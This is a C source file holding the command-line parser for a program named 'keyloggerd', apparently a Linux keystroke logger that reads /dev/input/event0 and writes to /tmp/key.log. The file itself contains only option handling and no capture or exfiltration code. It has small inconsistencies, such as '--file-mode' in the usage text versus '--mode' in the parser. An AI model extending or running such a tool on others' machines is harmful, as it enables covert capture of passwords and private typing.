#include <stdbool.h>    /* for bool */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>     /* for strrchr */
#include <sys/stat.h>

#include "common.h"
#include "input-args.h"
#include "keylog.h"

static const char usage_str[] =
"usage: keyloggerd [-h | --help] [--debug] [--file-mode <mode>]\n"
"                  [--keyboard-device <device_path>] [-f <logfile>]\n"
"                  [--append]";

#define is_equal(a, b) (!strcmp(a, b))

static mode_t str2mode(const char *mode_str)
{
    mode_t mode = 0;

    if (strlen(mode_str) == 3) {
        enum { USER, GROUP, OTHER };

        for (int k = USER; k <= OTHER; k++) {
            int octal = mode_str[k] - '0';

            if (k == USER) {
                if (octal & BIT(0)) {
                    mode |= S_IXUSR;
                }
                if (octal & BIT(1)) {
                    mode |= S_IWUSR;
                }
                if (octal & BIT(2)) {
                    mode |= S_IRUSR;
                }
            } else if (k == GROUP) {
                if (octal & BIT(0)) {
                    mode |= S_IXGRP;
                }
                if (octal & BIT(1)) {
                    mode |= S_IWGRP;
                }
                if (octal & BIT(2)) {
                    mode |= S_IRGRP;
                }
            } else if (k == OTHER) {
                if (octal & BIT(0)) {
                    mode |= S_IXOTH;
                }
                if (octal & BIT(1)) {
                    mode |= S_IWOTH;
                }
                if (octal & BIT(2)) {
                    mode |= S_IROTH;
                }
            }
        }
    }

    return mode;
}

static cmd_args_t arg_defaults(int argc, char *argv[])
{
    cmd_args_t default_args = {
        .keylog.mode = (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH),
        .keylog.backspace = 8, /* ascii char 8 == backspace */
    };

    char *prog_name;

    if ((prog_name = strrchr(argv[0], '/')) == NULL) {
        prog_name = argv[0];
    } else {
        prog_name++;
    }

    strncpy(default_args.prog_name, prog_name, MAX_PROG_NAME);
    strncpy(default_args.keyboard_device, "/dev/input/event0", MAX_DEVICE_PATH);
    strncpy(default_args.keylog.path, "/tmp/key.log", LOG_PATH_LEN);

    return default_args;
}

cmd_args_t parse_args(int argc, char *argv[])
{
    cmd_args_t cmd_args = arg_defaults(argc, argv);

    for (int k = 1; k < argc; k++) {
        const char *arg = argv[k];

        if (is_equal(arg, "-f")) {
            const char *filepath_str = argv[++k];

            if (filepath_str) {
                strncpy(cmd_args.keylog.path, filepath_str, LOG_PATH_LEN);
            } else {
                printf("Invalid file path for key log: %s\n", filepath_str);
                exit(1);
            }
        } else if (is_equal(arg, "--append")) {
            cmd_args.keylog.flags = KEY_LOG_FLAG_APPEND;
        } else if (is_equal(arg, "--backspace-char")) {
            const char *bc_str = argv[++k];

            if (bc_str) {
                cmd_args.keylog.backspace = bc_str[0];
            } else {
                printf("Invalid option for backspace char: %s\n", bc_str);
                exit(1);
            }
        } else if (is_equal(arg, "--keyboard-device")) {
            const char *device_str = argv[++k];

            if (device_str) {
                strncpy(cmd_args.keyboard_device, device_str, MAX_DEVICE_PATH);;
            } else {
                printf("Invalid option for device: %s\n", device_str);
                exit(1);
            }
        } else if (is_equal(arg, "--debug")) {
            cmd_args.debug = true;
        } else if (is_equal(arg, "--help") || is_equal(arg, "-h")) {
            printf("%s\n", usage_str);
            exit(0);
        } else if (is_equal(arg, "--mode")) {
            const char *mode_str = argv[++k];

            if (mode_str) {
                cmd_args.keylog.mode = str2mode(mode_str);
            } else {
                printf("Invalid option for mode: %s\n", mode_str);
                exit(1);
            }
        } else {
            printf("Unknown option: %s\n", argv[k]);
            printf("%s\n", usage_str);
            exit(1);
        }
    }

    return cmd_args;
}
